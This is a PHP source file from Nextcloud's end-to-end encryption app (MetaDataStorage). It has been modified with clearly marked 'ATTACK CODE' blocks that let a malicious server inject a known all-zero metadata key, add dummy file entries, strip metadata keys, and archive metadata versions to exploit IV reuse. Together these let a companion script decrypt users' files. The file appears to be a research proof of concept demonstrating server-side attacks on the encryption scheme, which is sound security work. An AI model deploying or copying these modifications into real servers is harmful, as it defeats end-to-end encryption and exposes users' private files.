<?php

declare(strict_types=1);
/**
 * @copyright Copyright (c) 2017 Bjoern Schiessle <bjoern@schiessle.org>
 * @copyright Copyright (c) 2020 Georg Ehrke <georg-nextcloud@ehrke.email>
 *
 * @license GNU AGPL version 3 or any later version
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

namespace OCA\EndToEndEncryption;

require_once '/var/www/nextcloud/apps/end_to_end_encryption/vendor/autoload.php';
use phpseclib3\Crypt\PublicKeyLoader;
use OC\User\NoUserException;
use OCA\EndToEndEncryption\Exceptions\MetaDataExistsException;
use OCA\EndToEndEncryption\Exceptions\MissingMetaDataException;
use OCP\Files\IAppData;
use OCP\Files\IRootFolder;
use OCP\Files\NotFoundException;
use OCP\Files\NotPermittedException;
use OCP\Files\SimpleFS\ISimpleFile;

/**
 * Class MetaDataStorage
 *
 * @package OCA\EndToEndEncryption
 */
class MetaDataStorage implements IMetaDataStorage {
	private IAppData $appData;
	private IRootFolder $rootFolder;
	private string $metaDataRoot = '/meta-data';
	private string $metaDataFileName = 'meta.data';
	private string $intermediateMetaDataFileName = 'intermediate.meta.data';

	public function __construct(IAppData $appData,
								IRootFolder $rootFolder) {
		$this->appData = $appData;
		$this->rootFolder = $rootFolder;
	}

	// BEGIN ATTACK CODE
	private function addMetadataMalicious(string $uid, int $id, string $metaData){
		// Get the user public key
		$key = $this->appData->getFolder("/public-keys")
				->getFile($uid.".public.key")
				->getContent();
		$dic  = json_decode($metaData);
		$metadataKey = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
		// Encrypt an all zero key with the user's public key
		$metadataKey = base64_encode(base64_encode($metadataKey));
		$pk = PublicKeyLoader::load($key)
			->withHash('sha256')
			->withMGFHash('sha256');
		$enc = base64_encode($pk->encrypt($metadataKey));
		// Add the encrypted key to the metadata keys. 
		$dic->metadata->metadataKeys->{'1'} = $enc;
		return json_encode($dic);
	}

	private function addFileMetadataMalicious(string $metaData){
		$metadata  = json_decode($metaData);
		$metadata->files->dummy = array("authenticationTag"=>"",
											"encrypted"=>"",
											"initializationVector"=>"",
											"metadataKey" => 1);
		return json_encode($metadata);
	}
	// END ATTACK CODE
	

	/**
	 * @inheritDoc
	 */
	public function getMetaData(string $userId, int $id): string {
		$this->verifyFolderStructure();
		$this->verifyOwner($userId, $id);

		$legacyFile = $this->getLegacyFile($userId, $id);
		if ($legacyFile !== null) {
			return $legacyFile->getContent();
		}

		$folderName = $this->getFolderNameForFileId($id);
		$folder = $this->appData->getFolder($folderName);
		$metaData = $folder
					->getFile($this->metaDataFileName)
					->getContent();
		//BEGIN ATTACK CODE
		/*
		This part of the code adds a chosen metadata key to the metadata keys.
		The metadata key will be used by the python script to decrypt the files.
		*/
		$config = json_decode(file_get_contents("/var/www/nextcloud/config/config.json"));
		if ($config->attack->type === "e2e_add_metadata_key"){
			$metaData = $this->addMetadataMalicious($userId, $id, $metaData);
		}
		if ($config->attack->type === "e2e_empty_metadata"){
			$metaData = $this->addFileMetadataMalicious($metaData);
		}
		//END ATTACK CODE
		
		return $metaData;
	}

	/**
	 * @inheritDoc
	 */
	public function setMetaDataIntoIntermediateFile(string $userId, int $id, string $metaData): void {
		$this->verifyFolderStructure();
		$this->verifyOwner($userId, $id);

		$legacyFile = $this->getLegacyFile($userId, $id);
		if ($legacyFile !== null) {
			throw new MetaDataExistsException('Legacy Meta-data file already exists');
		}

		$folderName = $this->getFolderNameForFileId($id);
		try {
			$dir = $this->appData->getFolder($folderName);
		} catch (NotFoundException $ex) {
			$dir = $this->appData->newFolder($folderName);
		}

		// Do not override metadata-file
		if ($dir->fileExists($this->metaDataFileName)) {
			throw new MetaDataExistsException('Meta-data file already exists');
		}

		if ($dir->fileExists($this->intermediateMetaDataFileName)) {
			throw new MetaDataExistsException('Intermediate meta-data file already exists');
		}

		$dir->newFile($this->intermediateMetaDataFileName)
			->putContent($metaData);
	}

	/**
	 * @inheritDoc
	 */
	public function updateMetaDataIntoIntermediateFile(string $userId, int $id, string $fileKey): void {
		// ToDo check signature for race condition
		$this->verifyFolderStructure();
		$this->verifyOwner($userId, $id);

		$legacyFile = $this->getLegacyFile($userId, $id);
		$folderName = $this->getFolderNameForFileId($id);
		try {
			$dir = $this->appData->getFolder($folderName);
		} catch (NotFoundException $ex) {
			// No folder and no legacy
			if ($legacyFile === null) {
				throw new MissingMetaDataException('Meta-data file missing');
			}

			$dir = $this->appData->newFolder($folderName);
		}

		if ($legacyFile === null && !$dir->fileExists($this->metaDataFileName)) {
			throw new MissingMetaDataException('Meta-data file missing');
		}

		try {
			$intermediateMetaDataFile = $dir->getFile($this->intermediateMetaDataFileName);
		} catch (NotFoundException $ex) {
			$intermediateMetaDataFile = $dir->newFile($this->intermediateMetaDataFileName);
		}

		$intermediateMetaDataFile
			->putContent($fileKey);
	}

	/**
	 * @inheritDoc
	 */
	public function deleteMetaData(string $userId, int $id): void {
		$this->verifyFolderStructure();
		$this->verifyOwner($userId, $id);

		$folderName = $this->getFolderNameForFileId($id);
		try {
			$dir = $this->appData->getFolder($folderName);
		} catch (NotFoundException $ex) {
			return;
		}

		$dir->delete();
		$this->cleanupLegacyFile($userId, $id);
	}

	/**
	 * @inheritDoc
	 */
	public function saveIntermediateFile(string $userId, int $id): void {
		$this->verifyFolderStructure();
		$this->verifyOwner($userId, $id);

		$folderName = $this->getFolderNameForFileId($id);
		try {
			$dir = $this->appData->getFolder($folderName);
		} catch (NotFoundException $ex) {
			throw new MissingMetaDataException('Intermediate meta-data file missing');
		}

		if (!$dir->fileExists($this->intermediateMetaDataFileName)) {
			throw new MissingMetaDataException('Intermediate meta-data file missing');
		}

		$intermediateMetaDataFile = $dir->getFile($this->intermediateMetaDataFileName);
		// If the intermediate file is empty, delete the metadata file
		if ($intermediateMetaDataFile->getContent() === '{}') {
			$dir->delete();
		} else {
			try {
				$finalFile = $dir->getFile($this->metaDataFileName);
			} catch (NotFoundException $ex) {
				$finalFile = $dir->newFile($this->metaDataFileName);
			}
			// BEGIN ATTACK CODE
			/*
			This section saves all the metadata version.
			Different metadata versions are used in the attack exploiting the IV reuse
			to get the tag value for two different versions of a file.  
			*/
			$config = json_decode(file_get_contents("/var/www/nextcloud/config/config.json"));
			if ($config->attack->versioning){
				$dir->newFile($this->metaDataFileName."-".date("m.d-h.i.s").".vs")
				->putContent($intermediateMetaDataFile->getContent());
			}
			// END ATTACK CODE

			//BEGIN ATTACK CODE
			/*
			This is the only code needed on the server to run the empty metadata key attack.
			The server modifies the metadata uploaded by the client so that the metadata key
			section is empty and the file metadata contains a dummy file.
			*/
			// $config = json_decode(file_get_contents("/var/www/nextcloud/config/config.json"));
			// if ($config->attack->type === "e2e_empty_metadata"){
			// 	$metadata = json_decode($intermediateMetaDataFile->getContent());
			// 	$metadata->metadata->metadataKeys = new \stdClass();
			// 	$metadata->files->dummy = array("authenticationTag"=>"",
			// 										"encrypted"=>"",
			// 										"initializationVector"=>"",
			// 										"metadataKey" => 0);
			// 	$intermediateMetaDataFile->putContent(json_encode($metadata));
			// }
			// END ATTACK CODE 

			$finalFile->putContent($intermediateMetaDataFile->getContent());
			// After successfully saving, automatically delete the intermediate file
			$intermediateMetaDataFile->delete();
		}

		$this->cleanupLegacyFile($userId, $id);
	}

	/**
	 * @inheritDoc
	 */
	public function deleteIntermediateFile(string $userId, int $id): void {
		$this->verifyFolderStructure();
		$this->verifyOwner($userId, $id);

		$folderName = $this->getFolderNameForFileId($id);
		try {
			$dir = $this->appData->getFolder($folderName);
		} catch (NotFoundException $ex) {
			return;
		}

		if (!$dir->fileExists($this->intermediateMetaDataFileName)) {
			return;
		}

		$dir->getFile($this->intermediateMetaDataFileName)
			->delete();
	}

	private function getFolderNameForFileId(int $id): string {
		return $this->metaDataRoot . '/' . $id;
	}

	/**
	 * Verifies that user has access to file-id
	 *
	 * @throws NotFoundException
	 */
	protected function verifyOwner(string $userId, int $id): void {
		try {
			$userFolder = $this->rootFolder->getUserFolder($userId);
		} catch (NoUserException | NotPermittedException $ex) {
			throw new NotFoundException('No user-root for '. $userId);
		}

		$ownerNodes = $userFolder->getById($id);
		if (!isset($ownerNodes[0])) {
			throw new NotFoundException('No file for owner with ID ' . $id);
		}
	}

	/**
	 * @throws NotFoundException
	 * @throws NotPermittedException
	 */
	protected function verifyFolderStructure(): void {
		$appDataRoot = $this->appData->getFolder('/');
		if (!$appDataRoot->fileExists($this->metaDataRoot)) {
			$this->appData->newFolder($this->metaDataRoot);
		}
	}

	/**
	 * @throws NotPermittedException
	 */
	protected function getLegacyFile(string $userId, int $id): ?ISimpleFile {
		try {
			$legacyOwnerPath = $this->getLegacyOwnerPath($userId, $id);
		} catch (NotFoundException $e) {
			// Just return if file does not exist for user
			return null;
		}

		try {
			$legacyFolder = $this->appData->getFolder($this->metaDataRoot . '/' . $legacyOwnerPath);
			return $legacyFolder->getFile($this->metaDataFileName);
		} catch (NotFoundException $e) {
			// Just return if no legacy file exits
			return null;
		}
	}

	/**
	 * @throws NotPermittedException
	 */
	protected function cleanupLegacyFile(string $userId, int $id): void {
		try {
			$legacyOwnerPath = $this->getLegacyOwnerPath($userId, $id);
		} catch (NotFoundException $e) {
			// Just return if file does not exist for user
			return;
		}

		try {
			$legacyFolder = $this->appData->getFolder($this->metaDataRoot . '/' . $legacyOwnerPath);
			$legacyFolder->delete();
		} catch (NotFoundException | NotPermittedException $e) {
			return;
		}
	}

	/**
	 * Get path to the file for the file-owner.
	 * This is needed for the old way of storing metadata-files.
	 *
	 * @throws NotFoundException
	 * @throws NotPermittedException
	 */
	protected function getLegacyOwnerPath(string $userId, int $id):string {
		try {
			$userFolder = $this->rootFolder->getUserFolder($userId);
		} catch (NoUserException $ex) {
			throw new NotFoundException('No user-root for '. $userId);
		}

		$ownerNodes = $userFolder->getById($id);
		if (!isset($ownerNodes[0])) {
			throw new NotFoundException('No file for owner with ID ' . $id);
		}

		return $ownerNodes[0]->getPath();
	}
}
